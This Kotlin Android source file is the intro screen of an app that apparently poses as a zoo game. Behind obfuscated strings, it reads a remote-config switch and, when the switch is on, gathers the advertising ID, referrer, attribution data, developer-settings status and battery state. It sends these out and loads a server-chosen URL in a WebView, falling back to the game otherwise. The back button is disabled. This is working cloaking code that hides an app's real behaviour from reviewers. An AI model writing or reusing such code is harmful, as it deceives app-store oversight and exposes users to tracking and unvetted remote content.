package com.upjers.zoo2animalpa.ui.intro_screen

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.animation.AnimationUtils
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.lifecycleScope
import androidx.lifecycle.repeatOnLifecycle
import com.upjers.zoo2animalpa.R
import com.upjers.zoo2animalpa.databinding.FragmentIntroBinding
import com.upjers.zoo2animalpa.model.CollectDataForLink
import com.upjers.zoo2animalpa.model.ConfigData
import com.upjers.zoo2animalpa.model.TrackingData
import com.upjers.zoo2animalpa.services.analytic.NotificationMessageManager.URL_KEY
import com.upjers.zoo2animalpa.services.analytic.NotificationMessageManager.changeLink
import com.upjers.zoo2animalpa.services.analytic.NotificationMessageManager.signalValue
import com.upjers.zoo2animalpa.services.analytic.NotificationTypes
import com.upjers.zoo2animalpa.services.analytic.checkAndNavigateWithValues
import com.upjers.zoo2animalpa.services.extensions.g_param.AdvertisingParamImpl
import com.upjers.zoo2animalpa.services.extensions.phone_param.PhoneExtensionImpl
import com.upjers.zoo2animalpa.services.params.config.FirebaseConfigImpl
import com.upjers.zoo2animalpa.services.params.long_awaited.m_apps_flyer.MyAppsFlyerImpl
import com.upjers.zoo2animalpa.services.params.long_awaited.m_apps_flyer.MyAppsFlyerImpl.Companion.APPS_FLYER_DEV_KEY
import com.upjers.zoo2animalpa.services.params.long_awaited.m_fb.MyFbImpl
import com.upjers.zoo2animalpa.services.params.long_awaited.m_fb.MyFbImpl.FacebookConstants.APP_ID
import com.upjers.zoo2animalpa.services.params.long_awaited.m_fb.MyFbImpl.FacebookConstants.DECRYPTION_KEY
import com.upjers.zoo2animalpa.services.params.long_awaited.m_fb.MyFbImpl.FacebookConstants.TOKEN
import com.upjers.zoo2animalpa.services.params.long_awaited.m_referrer.MyReferrerImpl
import com.upjers.zoo2animalpa.services.signal_pusher.MySignalPusherImpl
import com.upjers.zoo2animalpa.ui.host.AppContainerActivity
import com.upjers.zoo2animalpa.ui.intro_screen.interfaces.RemoteServerScheme
import com.upjers.zoo2animalpa.ui.web_screen.WorldWideWebActivity
import com.upjers.zoo2animalpa.viewmodels.IntroViewModel
import dagger.hilt.android.AndroidEntryPoint
import io.github.boiawidmb9mb12095n21b50215b16132.b21nm01om5n1905mw0bdkb2b515.ObfustringThis
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.flow.collectLatest
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

@ObfustringThis
@AndroidEntryPoint
class IntroFragment : Fragment(), RemoteServerScheme {

    private var _binding: FragmentIntroBinding? = null

    private val binding get() = _binding!!

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) {
            activateApp()
        }

    @Inject
    lateinit var referrerClient: MyReferrerImpl

    @Inject
    lateinit var facebookClient: MyFbImpl

    @Inject
    lateinit var firebaseClient: FirebaseConfigImpl

    @Inject
    lateinit var googleAdIdClient: AdvertisingParamImpl

    @Inject
    lateinit var userPhoneDataClient: PhoneExtensionImpl

    @Inject
    lateinit var oneSignalClient: MySignalPusherImpl

    private val introViewModel: IntroViewModel by viewModels()

    override fun onAttach(context: Context) {
        super.onAttach(context)
        onBackPressHandle()
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        _binding = FragmentIntroBinding.inflate(inflater, container, false)

        binding.setSlideToCenterAnimation()
        permissionPrepare()

        return binding.root
    }

    private fun permissionPrepare() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val permission = Manifest.permission.POST_NOTIFICATIONS
            val granted = PackageManager.PERMISSION_GRANTED
            if (ContextCompat.checkSelfPermission(requireActivity(), permission) == granted) {
                activateApp()
            } else {
                permissionLauncher.launch(permission)
            }
        } else activateApp()
    }

    private fun activateApp() {
        introViewModel.getUrlFromDataStore()

        lifecycleScope.launch {
            repeatOnLifecycle(Lifecycle.State.STARTED) {
                introViewModel.savedUrlState.collect { url ->
                    if (url.isNullOrBlank().not()) {
                        signalValue =
                            NotificationTypes.DIRECT_OPEN.description
                        pathToWeb(changeLink(url.toString()), isCache = true)
                        return@collect
                    } else {
                        remoteServerBuildProcess()
                    }
                }
            }
        }
    }

    override fun remoteServerBuildProcess() = lifecycleScope.launch {
        firebaseClient.customFetchAndActivate { configTask ->

            if (configTask.isSuccessful) {
                val firebaseRemoteConfig = firebaseClient.getDataClass()

                if (firebaseRemoteConfig.tracker.isBlank() || firebaseRemoteConfig.tracker.isEmpty() || firebaseRemoteConfig.tracker == "null") {
                    pathToLocalApp()
                } else {
                    collectSourceData(
                        firebaseRemoteConfig.fbAppId,
                        firebaseRemoteConfig.fbToken,
                        firebaseRemoteConfig
                    )
                }
            } else {
                pathToLocalApp()
            }
        }
    }

    private fun collectSourceData(
        fbAppId: String?,
        fbToken: String?,
        firebaseRemoteConfig: ConfigData
    ) {

        val data = CollectDataForLink()

        val appsInstance = MyAppsFlyerImpl(requireActivity())

        lifecycleScope.launch(Dispatchers.IO) {
            data.appsFlyerID = appsInstance.getServiceUID()
            listOf(
                async {
                    withContext(Dispatchers.IO) {
                        data.appsFlyerMap = appsInstance.getConversionMap()
                    }
                },
                async {
                    data.referrer = referrerClient.getServiceString()
                },
                async {
                    data.gaid = googleAdIdClient.getAdvertisingID()
                    data.appsFlyerID = appsInstance.getServiceUID()
                }
            ).awaitAll()

            listOf(
                async {
                    data.deeplink = facebookClient.getFetchedDeepLink(fbAppId, fbToken)
                },
                async {
                    data.adb = userPhoneDataClient.isDeveloperSettingsEnable()
                    data.bundle = userPhoneDataClient.getAppPackageName()
                    data.battery = userPhoneDataClient.getChargeStatus()
                }
            ).awaitAll()

            val fbDec = firebaseClient.getFbDec()

            val extractedTracker = firebaseRemoteConfig.tracker

            val trackingData = TrackingData(
                facebookDeeplink = data.deeplink,
                installReferrer = data.referrer,
                facebookDecryption = checkRemoteFirebaseString(
                    remote = fbDec,
                    defaultString = DECRYPTION_KEY
                ),
                randomParamsInLinkEnabled = false,
                applicationId = data.bundle,
                appsId = data.appsFlyerID,
                googleAdId = data.gaid,
                appDeveloperKey = APPS_FLYER_DEV_KEY,
                userBattery = data.battery.toString(),
                remoteConfig = ConfigData(
                    tracker = extractedTracker,
                    isAppsFlyerEnabled = firebaseRemoteConfig.isAppsFlyerEnabled,
                    fbAppId = checkRemoteFirebaseString(
                        remote = firebaseRemoteConfig.fbAppId,
                        defaultString = APP_ID
                    ),
                    fbToken = checkRemoteFirebaseString(
                        remote = firebaseRemoteConfig.fbToken,
                        defaultString = TOKEN
                    )
                ),
                attributionData = data.appsFlyerMap,
                isUserDeveloper = data.adb
            )

            introViewModel.getRemoteData(trackingData)

            lifecycleScope.launch {
                repeatOnLifecycle(Lifecycle.State.STARTED) {
                    introViewModel.finalLinkState.collectLatest { remoteData ->

                        val url = remoteData.url
                        val push = remoteData.push

                        if (url != null && url.isNotBlank()) {
                            oneSignalClient.pushConnectionData(
                                id = data.appsFlyerID.toString(),
                                sentence = push ?: "organic"
                            )

                            signalValue = NotificationTypes.FIRST_OPEN.description
                            pathToWeb(changeLink(url), isCache = false)
                        } else {
                            pathToLocalApp()
                        }
                    }
                }
            }
        }
    }

    override fun pathToWeb(appUrl: String?, isCache: Boolean) {
        Intent(context, WorldWideWebActivity::class.java).run {
            putExtra(URL_KEY, appUrl)
            requireActivity().checkAndNavigateWithValues(this, isCache) {
                requireActivity().finish()
            }
        }
    }

    override fun pathToLocalApp() {
        Intent(context, AppContainerActivity::class.java).run {
            requireActivity().checkAndNavigateWithValues(this) {
                requireActivity().finish()
            }
        }
    }

    private fun onBackPressHandle() {
        val callback = object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {}
        }

        requireActivity().onBackPressedDispatcher.addCallback(
            this,
            callback
        )
    }

    private fun FragmentIntroBinding.setSlideToCenterAnimation() {
        val bottomAnim =
            AnimationUtils.loadAnimation(requireActivity(), R.anim.slide_from_bottom_25)
        cardLoader.animation = bottomAnim
    }

    private fun checkRemoteFirebaseString(remote: String?, defaultString: String): String {
        return if (remote.isNullOrEmpty() || remote == "null" || remote == "NULL") {
            defaultString
        } else remote
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}